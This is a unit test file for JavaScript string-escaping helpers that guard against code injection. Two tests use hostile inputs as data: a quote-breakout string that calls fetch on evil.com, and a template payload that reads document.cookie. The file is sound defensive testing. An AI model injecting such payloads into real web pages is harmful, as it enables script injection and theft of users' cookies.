// test/unit/escape.test.ts
import { describe, it, expect } from 'vitest';
import { escapeForJsSingleQuote, escapeForTemplateLiteral } from '../../src/escape.js';

describe('escapeForJsSingleQuote', () => {
  it('escapes backslash before single quote (order matters)', () => {
    // Input has a literal backslash followed by a quote: \'
    // Must produce \\' (escaped backslash + escaped quote)
    const input = "a\\'b";  // JS string: a\'b (4 chars: a, \, ', b)
    const result = escapeForJsSingleQuote(input);
    // After escaping: a\\\\'b → embedded in 'a\\\\'b' the JS engine sees a\\'b → a\'b
    expect(result).toBe("a\\\\\\'b");
  });

  it('escapes standalone backslash', () => {
    expect(escapeForJsSingleQuote('a\\b')).toBe('a\\\\b');
  });

  it('escapes standalone single quote', () => {
    expect(escapeForJsSingleQuote("a'b")).toBe("a\\'b");
  });

  it('escapes newline characters', () => {
    expect(escapeForJsSingleQuote('a\nb')).toBe('a\\nb');
    expect(escapeForJsSingleQuote('a\rb')).toBe('a\\rb');
  });

  it('escapes null byte', () => {
    expect(escapeForJsSingleQuote('a\0b')).toBe('a\\0b');
  });

  it('escapes JS line terminators U+2028 and U+2029', () => {
    expect(escapeForJsSingleQuote('a\u2028b')).toBe('a\\u2028b');
    expect(escapeForJsSingleQuote('a\u2029b')).toBe('a\\u2029b');
  });

  it('handles empty string', () => {
    expect(escapeForJsSingleQuote('')).toBe('');
  });

  it('handles string with no special characters', () => {
    expect(escapeForJsSingleQuote('div.class > span')).toBe('div.class > span');
  });

  it('injection vector: selector with backslash-quote breakout', () => {
    // Attack: body\'; fetch('https://evil.com');//
    const attack = "body\\'; fetch('https://evil.com');//";
    const escaped = escapeForJsSingleQuote(attack);
    // Result must not allow string termination
    // When embedded in '...', the escaped version must be a valid JS string content
    expect(escaped).not.toMatch(/[^\\]'/); // no unescaped quote
  });
});

describe('escapeForTemplateLiteral', () => {
  it('escapes backslash', () => {
    expect(escapeForTemplateLiteral('a\\b')).toBe('a\\\\b');
  });

  it('escapes backtick', () => {
    expect(escapeForTemplateLiteral('a`b')).toBe('a\\`b');
  });

  it('escapes dollar-brace sequence', () => {
    expect(escapeForTemplateLiteral('${foo}')).toBe('\\${foo}');
  });

  it('does not escape lone dollar without brace', () => {
    expect(escapeForTemplateLiteral('$100')).toBe('$100');
  });

  it('escapes all dangerous sequences together', () => {
    const input = '\\`${x}';
    expect(escapeForTemplateLiteral(input)).toBe('\\\\\\`\\${x}');
  });

  it('injection vector: cookie exfiltration via template', () => {
    const attack = '${document.cookie}';
    const escaped = escapeForTemplateLiteral(attack);
    expect(escaped).toBe('\\${document.cookie}');
    // No unescaped ${ (i.e., ${ not preceded by backslash)
    expect(escaped).not.toMatch(/(?<!\\)\$\{/);
  });

  it('handles empty string', () => {
    expect(escapeForTemplateLiteral('')).toBe('');
  });
});
